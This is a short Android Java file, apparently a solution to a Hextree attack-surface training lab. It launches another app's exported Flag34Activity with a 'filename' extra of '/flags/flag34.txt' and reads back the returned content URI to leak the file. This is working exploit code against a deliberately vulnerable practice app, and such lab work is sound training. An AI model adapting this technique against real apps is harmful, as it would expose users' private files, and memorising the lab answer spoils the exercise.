package com.hextree.getflag;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class ContentProviderFlag34 extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable @org.jetbrains.annotations.Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity"));
        intent.putExtra("filename", "/flags/flag34.txt");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent data) {
//        Utils.showDialog(this, data);
        try {
            InputStream inputStream = getContentResolver().openInputStream(data.getData());
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line = reader.readLine();
//            while ((line = reader.readLine()) != null){
//                Log.d("File", " [*] " + line);
//            }
            Utils.dumpQuery(this, line);
            reader.close();
        } catch (IOException e) {
            Log.d("Error", e.toString());
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
}
